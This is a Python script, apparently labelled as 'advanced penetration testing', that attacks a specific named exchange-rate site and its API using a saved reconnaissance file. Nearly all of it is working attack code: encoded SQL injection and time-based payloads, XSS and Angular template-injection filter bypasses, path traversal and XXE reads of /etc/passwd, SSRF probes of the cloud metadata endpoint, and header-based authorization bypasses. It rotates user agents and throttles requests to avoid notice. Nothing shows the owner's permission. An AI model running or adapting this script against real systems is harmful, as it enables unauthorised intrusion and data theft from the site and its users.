#!/usr/bin/env python3
"""
Advanced Penetration Testing - Continued Deep Analysis
Focuses on advanced techniques, bypass methods, and sophisticated attacks
"""

import sys
import os
import site
import json
import time
import random
import re
import base64
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from datetime import datetime

user_site = site.getusersitepackages()
if user_site and os.path.exists(user_site):
    sys.path.insert(0, user_site)

import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class AdvancedPenTest:
    """Advanced penetration testing with sophisticated techniques."""
    
    def __init__(self, intelligence_file):
        with open(intelligence_file, 'r') as f:
            self.intel = json.load(f)
        
        self.target_url = self.intel['target']
        self.domain = self.intel['domain']
        self.base_url = f"https://{self.domain}"
        
        # Setup session
        self.session = requests.Session()
        retry_strategy = Retry(total=1, backoff_factor=1)
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        ]
        
        self.findings = []
        self.request_delay = 4.0  # More conservative
        self.last_request = 0
    
    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.OKCYAN, "SUCCESS": Colors.OKGREEN,
            "WARNING": Colors.WARNING, "ERROR": Colors.FAIL,
            "HEADER": Colors.HEADER, "BOLD": Colors.BOLD
        }
        color = colors.get(level, Colors.ENDC)
        print(f"{color}[{timestamp}] {msg}{Colors.ENDC}")
    
    def safe_request(self, url, method='GET', headers=None, **kwargs):
        """Make request with rotation and delays."""
        current = time.time()
        elapsed = current - self.last_request
        if elapsed < self.request_delay:
            time.sleep(self.request_delay - elapsed)
        
        req_headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'ru-RU,ru;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': self.base_url,
            'Connection': 'keep-alive',
        }
        if headers:
            req_headers.update(headers)
        
        self.session.headers.update(req_headers)
        self.last_request = time.time()
        
        try:
            if method == 'GET':
                return self.session.get(url, timeout=25, **kwargs)
            elif method == 'POST':
                return self.session.post(url, timeout=25, **kwargs)
            else:
                return self.session.request(method, url, timeout=25, **kwargs)
        except Exception as e:
            return None
    
    def test_advanced_sqli(self):
        """Advanced SQL injection with encoding and bypass techniques."""
        self.log("\n[ADVANCED SQLI] Testing with encoding bypasses", "BOLD")
        
        index_endpoints = [e for e in self.intel['endpoints'] if 'index.php' in e and '?' in e]
        
        # Advanced payloads with encoding
        advanced_payloads = [
            # URL encoded
            ("%27%20OR%20%271%27%3D%271", "URL encoded"),
            # Double URL encoded
            ("%2527%2520OR%2520%25271%2527%253D%25271", "Double URL encoded"),
            # Unicode
            ("%u0027%20OR%20%u00271%u0027=%u00271", "Unicode encoded"),
            # Hex encoded
            ("0x27 OR 0x31=0x31", "Hex encoded"),
            # Comment variations
            ("' OR 1=1#", "Hash comment"),
            ("' OR 1=1-- -", "Double dash with space"),
            ("' OR 1=1/**/", "Multi-line comment"),
            # Time-based with encoding
            ("' AND SLEEP(3)--", "Time-based"),
            ("' UNION SELECT NULL,NULL,NULL--", "UNION based"),
        ]
        
        for endpoint in index_endpoints[:2]:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            if 'mt' not in params:
                continue
            
            for payload, description in advanced_payloads:
                test_params = params.copy()
                test_params['mt'] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                self.log(f"  Testing: {description} - {payload[:30]}...", "INFO")
                
                start_time = time.time()
                response = self.safe_request(test_url, params=test_params)
                elapsed = time.time() - start_time
                
                if response and response.status_code == 200:
                    # Check for SQL errors
                    sql_errors = [
                        'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                        'database error', 'query failed', 'sqlstate',
                        'warning: mysql', 'postgres query failed'
                    ]
                    
                    response_lower = response.text.lower()
                    for error in sql_errors:
                        if error in response_lower:
                            finding = {
                                'type': 'SQL Injection (Advanced)',
                                'severity': 'High',
                                'url': endpoint,
                                'parameter': 'mt',
                                'payload': payload,
                                'encoding': description,
                                'evidence': f"SQL error: {error}",
                                'confidence': 80
                            }
                            self.findings.append(finding)
                            self.log(f"    ⚠ SQL Injection detected with {description}!", "WARNING")
                            break
                    
                    # Check for time-based SQLi
                    if elapsed > 2.5 and 'sleep' in payload.lower():
                        finding = {
                            'type': 'SQL Injection (Time-based)',
                            'severity': 'High',
                            'url': endpoint,
                            'parameter': 'mt',
                            'payload': payload,
                            'evidence': f"Response delayed by {elapsed:.2f} seconds",
                            'confidence': 75
                        }
                        self.findings.append(finding)
                        self.log(f"    ⚠ Time-based SQLi detected! ({elapsed:.2f}s delay)", "WARNING")
    
    def test_advanced_xss(self):
        """Advanced XSS with encoding and filter bypasses."""
        self.log("\n[ADVANCED XSS] Testing with encoding bypasses", "BOLD")
        
        forms = self.intel.get('forms', [])
        
        # Advanced XSS payloads
        xss_payloads = [
            # Basic
            ("<script>alert('XSS')</script>", "Basic script tag"),
            # Event handlers
            ("<img src=x onerror=alert('XSS')>", "Img onerror"),
            ("<svg onload=alert('XSS')>", "SVG onload"),
            ("<body onload=alert('XSS')>", "Body onload"),
            # Encoded
            ("%3Cscript%3Ealert('XSS')%3C/script%3E", "URL encoded"),
            ("&#60;script&#62;alert('XSS')&#60;/script&#62;", "HTML entity"),
            ("\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E", "Hex encoded"),
            # Filter bypasses
            ("<ScRiPt>alert('XSS')</ScRiPt>", "Case variation"),
            ("<script>alert(String.fromCharCode(88,83,83))</script>", "String.fromCharCode"),
            ("<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "Eval with char codes"),
            # Angular specific (since site uses Angular)
            ("{{constructor.constructor('alert(1)')()}}", "Angular template injection"),
            ("{{$eval.constructor('alert(1)')()}}", "Angular $eval"),
        ]
        
        for form in forms[:3]:
            form_url = urljoin(self.base_url, form.get('action', '/'))
            method = form.get('method', 'GET').upper()
            
            params = {}
            for inp in form.get('inputs', [])[:2]:
                name = inp.get('name') or inp.get('id', '')
                if name:
                    params[name] = 'test'
            
            if not params:
                continue
            
            for payload, description in xss_payloads:
                test_params = {k: payload for k in params.keys()}
                
                self.log(f"  Testing: {description} on {form_url[:50]}...", "INFO")
                
                response = self.safe_request(
                    form_url,
                    method=method,
                    params=test_params if method == 'GET' else None,
                    data=test_params if method == 'POST' else None
                )
                
                if response and response.status_code == 200:
                    # Check if payload is reflected
                    if payload in response.text or unquote(payload) in response.text:
                        # Check context
                        soup = BeautifulSoup(response.text, 'html.parser')
                        
                        # Check if in script tag
                        if '<script>' in response.text.lower():
                            finding = {
                                'type': 'XSS (Reflected - Script Context)',
                                'severity': 'High',
                                'url': form_url,
                                'parameter': list(params.keys())[0],
                                'payload': payload,
                                'description': description,
                                'evidence': 'Payload reflected in script context',
                                'confidence': 85
                            }
                            self.findings.append(finding)
                            self.log(f"    ⚠ XSS in script context!", "WARNING")
                        else:
                            finding = {
                                'type': 'XSS (Reflected)',
                                'severity': 'Medium',
                                'url': form_url,
                                'parameter': list(params.keys())[0],
                                'payload': payload,
                                'description': description,
                                'evidence': 'Payload reflected in response',
                                'confidence': 60
                            }
                            self.findings.append(finding)
                            self.log(f"    ⚠ XSS payload reflected!", "WARNING")
    
    def test_http_methods(self):
        """Test HTTP method support and misconfigurations."""
        self.log("\n[HTTP METHODS] Testing method support", "BOLD")
        
        test_endpoints = [
            self.base_url,
            urljoin(self.base_url, '/index.php'),
            urljoin(self.base_url, '/click.php?id=1'),
        ]
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE', 'HEAD']
        
        for endpoint in test_endpoints:
            self.log(f"  Testing: {endpoint[:60]}...", "INFO")
            
            for method in methods:
                if method == 'OPTIONS':
                    response = self.safe_request(endpoint, method='OPTIONS')
                    if response:
                        allowed = response.headers.get('Allow', '')
                        if allowed:
                            self.log(f"    → Allowed methods: {allowed}", "SUCCESS")
                else:
                    response = self.safe_request(endpoint, method=method)
                    if response and response.status_code not in [405, 501]:
                        finding = {
                            'type': f'HTTP Method {method} Allowed',
                            'severity': 'Info' if method in ['GET', 'POST'] else 'Medium',
                            'url': endpoint,
                            'method': method,
                            'status': response.status_code,
                            'evidence': f'Method {method} returns {response.status_code}',
                            'confidence': 100
                        }
                        if method in ['PUT', 'DELETE', 'TRACE']:
                            finding['severity'] = 'Medium'
                            self.log(f"    ⚠ Potentially dangerous method {method} allowed!", "WARNING")
                        self.findings.append(finding)
    
    def test_path_traversal(self):
        """Test for path traversal vulnerabilities."""
        self.log("\n[PATH TRAVERSAL] Testing directory traversal", "BOLD")
        
        # Look for file-related endpoints
        file_endpoints = [e for e in self.intel['endpoints'] if any(x in e.lower() for x in ['file', 'download', 'read', 'view', 'image', 'img'])]
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%2f..%2f..%2fetc%2fpasswd',
        ]
        
        for endpoint in file_endpoints[:5]:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            file_params = [k for k in params.keys() if any(x in k.lower() for x in ['file', 'path', 'dir', 'name'])]
            
            for param in file_params[:1]:
                for payload in traversal_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    self.log(f"  Testing: {param}={payload[:30]}...", "INFO")
                    
                    response = self.safe_request(test_url, params=test_params)
                    
                    if response and response.status_code == 200:
                        # Check for signs of file read
                        indicators = ['root:', 'bin:', '/etc/passwd', 'localhost', '[extensions]']
                        response_lower = response.text.lower()
                        
                        for indicator in indicators:
                            if indicator in response_lower:
                                finding = {
                                    'type': 'Path Traversal',
                                    'severity': 'High',
                                    'url': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f"File content indicator: {indicator}",
                                    'confidence': 80
                                }
                                self.findings.append(finding)
                                self.log(f"    ⚠ Path traversal detected!", "WARNING")
                                break
    
    def test_ssrf(self):
        """Test for Server-Side Request Forgery."""
        self.log("\n[SSRF] Testing for SSRF vulnerabilities", "BOLD")
        
        # Look for URL-related parameters
        url_endpoints = [e for e in self.intel['endpoints'] if any(x in e.lower() for x in ['url', 'link', 'fetch', 'proxy', 'image', 'img'])]
        
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:80',
        ]
        
        for endpoint in url_endpoints[:3]:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            url_params = [k for k in params.keys() if any(x in k.lower() for x in ['url', 'link', 'src', 'href'])]
            
            for param in url_params[:1]:
                for payload in ssrf_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    self.log(f"  Testing SSRF: {param}={payload[:40]}...", "INFO")
                    
                    response = self.safe_request(test_url, params=test_params)
                    
                    if response and response.status_code == 200:
                        # Check for internal content
                        indicators = ['127.0.0.1', 'localhost', 'internal', 'private']
                        response_lower = response.text.lower()
                        
                        for indicator in indicators:
                            if indicator in response_lower:
                                finding = {
                                    'type': 'SSRF (Potential)',
                                    'severity': 'High',
                                    'url': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f"Internal content indicator: {indicator}",
                                    'confidence': 60
                                }
                                self.findings.append(finding)
                                self.log(f"    ⚠ Potential SSRF detected!", "WARNING")
                                break
    
    def test_xxe(self):
        """Test for XML External Entity injection."""
        self.log("\n[XXE] Testing for XXE vulnerabilities", "BOLD")
        
        # Look for XML-related endpoints
        xml_endpoints = [e for e in self.intel['endpoints'] if any(x in e.lower() for x in ['xml', 'rss', 'feed', 'soap'])]
        
        if not xml_endpoints:
            # Test forms that might accept XML
            forms = self.intel.get('forms', [])
            for form in forms[:2]:
                if form.get('method', 'GET').upper() == 'POST':
                    form_url = urljoin(self.base_url, form.get('action', '/'))
                    
                    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''
                    
                    self.log(f"  Testing XXE on form: {form_url[:50]}...", "INFO")
                    
                    headers = {'Content-Type': 'application/xml'}
                    response = self.safe_request(form_url, method='POST', headers=headers, data=xxe_payload)
                    
                    if response and response.status_code == 200:
                        if 'root:' in response.text or '/bin/' in response.text:
                            finding = {
                                'type': 'XXE (XML External Entity)',
                                'severity': 'High',
                                'url': form_url,
                                'evidence': 'File content in response',
                                'confidence': 80
                            }
                            self.findings.append(finding)
                            self.log(f"    ⚠ XXE detected!", "WARNING")
    
    def test_api_authentication(self):
        """Test API authentication mechanisms."""
        self.log("\n[API AUTH] Testing API authentication", "BOLD")
        
        api_base = "https://api.bestchange.com"
        api_paths = ['/', '/v1', '/api', '/rates', '/exchange']
        
        # Test without auth
        for path in api_paths[:3]:
            test_url = f"{api_base}{path}"
            self.log(f"  Testing: {test_url}", "INFO")
            
            response = self.safe_request(test_url)
            
            if response:
                if response.status_code == 200:
                    # Check response content
                    content_type = response.headers.get('Content-Type', '')
                    if 'json' in content_type:
                        try:
                            data = response.json()
                            # Look for sensitive info
                            sensitive = ['password', 'token', 'secret', 'key', 'api_key']
                            for key in sensitive:
                                if key.lower() in str(data).lower():
                                    finding = {
                                        'type': 'Information Disclosure (API)',
                                        'severity': 'High',
                                        'url': test_url,
                                        'evidence': f"Sensitive key '{key}' in response",
                                        'confidence': 80
                                    }
                                    self.findings.append(finding)
                                    self.log(f"    ⚠ Sensitive data: {key}", "WARNING")
                        except:
                            pass
                
                elif response.status_code in [401, 403]:
                    # Try bypass techniques
                    bypass_headers = [
                        {'X-Forwarded-For': '127.0.0.1'},
                        {'X-Real-IP': '127.0.0.1'},
                        {'X-Originating-IP': '127.0.0.1'},
                        {'Authorization': 'Bearer test'},
                        {'X-API-Key': 'test'},
                    ]
                    
                    for header in bypass_headers:
                        test_response = self.safe_request(test_url, headers=header)
                        if test_response and test_response.status_code == 200:
                            finding = {
                                'type': 'API Authorization Bypass',
                                'severity': 'High',
                                'url': test_url,
                                'header': header,
                                'evidence': 'API accessible with bypass header',
                                'confidence': 75
                            }
                            self.findings.append(finding)
                            self.log(f"    ⚠ Authorization bypass: {list(header.keys())[0]}", "WARNING")
                            break
    
    def run(self):
        """Execute all advanced tests."""
        self.log("=" * 80, "HEADER")
        self.log("ADVANCED PENETRATION TESTING - CONTINUED", "HEADER")
        self.log("=" * 80, "HEADER")
        
        self.test_advanced_sqli()
        self.test_advanced_xss()
        self.test_http_methods()
        self.test_path_traversal()
        self.test_ssrf()
        self.test_xxe()
        self.test_api_authentication()
        
        # Save findings
        report = {
            'target': self.target_url,
            'test_date': datetime.now().isoformat(),
            'test_type': 'Advanced Penetration Testing',
            'findings': self.findings,
            'summary': {
                'total': len(self.findings),
                'critical': len([f for f in self.findings if f.get('severity') == 'Critical']),
                'high': len([f for f in self.findings if f.get('severity') == 'High']),
                'medium': len([f for f in self.findings if f.get('severity') == 'Medium']),
                'info': len([f for f in self.findings if f.get('severity') == 'Info']),
            }
        }
        
        filename = f"advanced_findings_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        self.log(f"\n[SUMMARY]", "BOLD")
        self.log(f"  Total Findings: {len(self.findings)}", "INFO")
        self.log(f"  Critical: {report['summary']['critical']}", 
                 "FAIL" if report['summary']['critical'] > 0 else "INFO")
        self.log(f"  High: {report['summary']['high']}", 
                 "WARNING" if report['summary']['high'] > 0 else "INFO")
        self.log(f"  Medium: {report['summary']['medium']}", "INFO")
        self.log(f"  Report saved: {filename}", "SUCCESS")
        
        return report


if __name__ == "__main__":
    intel_file = "intelligence_bestchange.com_20251207_131721.json"
    
    if not os.path.exists(intel_file):
        print(f"Intelligence file not found: {intel_file}")
        sys.exit(1)
    
    tester = AdvancedPenTest(intel_file)
    tester.run()
